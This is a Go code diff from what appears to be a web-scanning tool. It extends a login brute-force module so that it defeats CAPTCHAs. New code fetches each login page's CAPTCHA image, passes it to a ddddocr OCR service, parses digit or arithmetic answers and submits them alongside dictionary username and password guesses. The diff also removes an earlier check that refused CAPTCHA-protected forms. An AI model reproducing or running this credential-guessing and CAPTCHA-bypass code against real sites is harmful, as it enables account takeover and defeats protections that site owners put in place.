@@ -13,9 +13,12 @@ import (
 	"fmt"
 	"net/url"
 	"os"
+	"regexp"
+	"strconv"
 	"strings"
 	"time"
 
+	"cnb.cool/feng-qiao/sitelens/internal/captcha"
 	"cnb.cool/feng-qiao/sitelens/internal/htmlx"
 	"cnb.cool/feng-qiao/sitelens/internal/httpx"
 )
@@ -204,6 +207,79 @@ func sleepInterval(intervalMS, attemptIndex int) {
 	}
 }
 
+// solveCaptcha 刷新登录页取新验证码图，拉取字节后经 ddddocr sidecar 识别。
+// digits：仅保留字母数字；calc：从识别文本解析两步算术并计算。
+func solveCaptcha(p Poster, opts Options, pageURL string, fallbackImgs []string) (string, error) {
+	_, body, err := p.GetSmall(pageURL)
+	if err != nil {
+		return "", err
+	}
+	imgs := htmlx.Parse(body).CaptchaImgs
+	if len(imgs) == 0 {
+		imgs = fallbackImgs
+	}
+	if len(imgs) == 0 {
+		return "", fmt.Errorf("页面未找到验证码图片")
+	}
+	imgURL := resolveRef(pageURL, imgs[0])
+	if opts.FetchImage == nil {
+		return "", fmt.Errorf("未配置图片拉取通道")
+	}
+	raw, err := opts.FetchImage(imgURL)
+	if err != nil {
+		return "", err
+	}
+	cli := captcha.NewClient(opts.OCRURL, 10*time.Second)
+	code, err := cli.SolveImage(raw)
+	if err != nil {
+		return "", err
+	}
+	code = strings.TrimSpace(code)
+	if strings.EqualFold(opts.CaptchaType, "calc") {
+		v, ok := calcEval(code)
+		if !ok {
+			return "", fmt.Errorf("算术验证码解析失败：%q", code)
+		}
+		return strconv.Itoa(v), nil
+	}
+	// digits：仅保留字母数字（OCR 常带噪声）
+	return strings.Map(func(r rune) rune {
+		if r >= '0' && r <= '9' || r >= 'a' && r <= 'z' || r >= 'A' && r <= 'Z' {
+			return r
+		}
+		return -1
+	}, code), nil
+}
+
+var calcRe = regexp.MustCompile(`(\d{1,4})\s*([+\-x×*÷/])\s*(\d{1,4})`)
+
+// calcEval 从识别文本解析「a op b」并计算；手工实现，不用 eval。
+func calcEval(text string) (int, bool) {
+	m := calcRe.FindStringSubmatch(strings.NewReplacer("×", "*", "÷", "/").Replace(text))
+	if m == nil {
+		return 0, false
+	}
+	a, e1 := strconv.Atoi(m[1])
+	b, e2 := strconv.Atoi(m[3])
+	if e1 != nil || e2 != nil {
+		return 0, false
+	}
+	switch m[2] {
+	case "+":
+		return a + b, true
+	case "-":
+		return a - b, true
+	case "*", "x":
+		return a * b, true
+	case "/":
+		if b != 0 {
+			return a / b, true
+		}
+		return 0, false
+	}
+	return 0, false
+}
+
 // Poster 表单提交接口（由 httpx 适配）。
 type Poster interface {
 	PostForm(rawURL string, fields map[string]string) (status int, body string, err error)
@@ -212,25 +288,31 @@ type Poster interface {
 
 // Options 爆破参数。
 type Options struct {
-	PageURL      string   // 登录页地址
-	Users        []string // 用户名字典
-	Passwords    []string // 密码字典
-	MaxTries     int      // 总尝试硬上限
-	IntervalMS   int      // 相邻尝试间隔（毫秒，0 = 不间隔）
-	CaptchaType  string   // 非空非 none 直接报错（Go 版未含 OCR）
-	RenderedBody string   // SPA 支持：无头渲染后的页面 HTML；非空时表单解析优先使用它
+	PageURL      string                              // 登录页地址
+	Users        []string                            // 用户名字典
+	Passwords    []string                            // 密码字典
+	MaxTries     int                                 // 总尝试硬上限
+	IntervalMS   int                                 // 相邻尝试间隔（毫秒，0 = 不间隔）
+	CaptchaType  string                              // 验证码类型（none/digits/calc；digits|calc 需配 OCRURL）
+	OCRURL       string                              // ddddocr sidecar 地址（空 = 无 OCR 能力）
+	CaptchaImgs  []string                            // 登录页中的验证码图片地址（相对/绝对均可）
+	FetchImage   func(rawURL string) ([]byte, error) // 验证码图片字节拉取
+	RenderedBody string                              // SPA 支持：无头渲染后的页面 HTML；非空时表单解析优先使用它
 }
 
 // Brute 执行爆破：返回命中列表（命中一组即停，控制请求量）。
 // 表单解析优先使用 RenderedBody（SPA 登录页由 chromedp 渲染后传入），
 // 为空时抓取 PageURL 的静态 HTML——纯 JS 渲染且未开无头渲染的页面
 // 会解析不到表单并明确报错。
+// CaptchaType=digits/calc 时需配 OCRURL（ddddocr sidecar）：
+// 每次尝试前刷新登录页取新验证码图，OCR 识别后自动填入验证码字段。
 func Brute(p Poster, opts Options, onProgress func(done, total int, msg string)) ([]Hit, error) {
 	if onProgress == nil {
 		onProgress = func(int, int, string) {}
 	}
-	if opts.CaptchaType != "" && !strings.EqualFold(opts.CaptchaType, "none") {
-		return nil, fmt.Errorf("该登录页需要验证码识别，Go 版暂未包含该能力；请改用无验证码的表单页或使用 Python 分支")
+	if opts.CaptchaType != "" && !strings.EqualFold(opts.CaptchaType, "none") && opts.OCRURL == "" {
+		return nil, fmt.Errorf("该登录页需要验证码识别：请先启动 ddddocr sidecar" +
+			"（python tools/ocr_server.py）并在配置 loginbrute.captcha_ocr_url 指向它")
 	}
 	if opts.MaxTries <= 0 {
 		opts.MaxTries = 300
@@ -253,6 +335,10 @@ func Brute(p Poster, opts Options, onProgress func(done, total int, msg string))
 		return nil, fmt.Errorf("未解析到含密码框的登录表单（%s：表单 %d 个，输入框 %d 个，密码框 %d 个）。"+
 			"若页面由 JS 动态渲染登录框，请在 crawler.headless 开启无头渲染后重试",
 			formSrc, diag.Forms, diag.Inputs, diag.Passwords)
+	}
+	if form.CaptchaField != "" && opts.OCRURL == "" {
+		return nil, fmt.Errorf("登录表单含验证码字段（%s）但未配置识别服务；"+
+			"请在配置 loginbrute.captcha_ocr_url 指向 ddddocr sidecar 后重试", form.CaptchaField)
 	}
 
 	combos := []struct{ u, pw string }{}
@@ -283,6 +369,15 @@ func Brute(p Poster, opts Options, onProgress func(done, total int, msg string))
 		}
 		fields[form.UserField] = c.u
 		fields[form.PassField] = c.pw
+		if form.CaptchaField != "" {
+			// 每次尝试前刷新登录页取新验证码图（旧码通常已失效）
+			code, cerr := solveCaptcha(p, opts, pageURL, doc.CaptchaImgs)
+			if cerr != nil {
+				onProgress(i+2, total, "验证码识别失败，跳过 "+c.u+"："+cerr.Error())
+				continue
+			}
+			fields[form.CaptchaField] = code
+		}
 		rStatus, rBody, rerr := p.PostForm(form.Action, fields)
 		onProgress(i+2, total, c.u+" / "+strings.Repeat("*", len(c.pw)))
 		if rerr != nil {
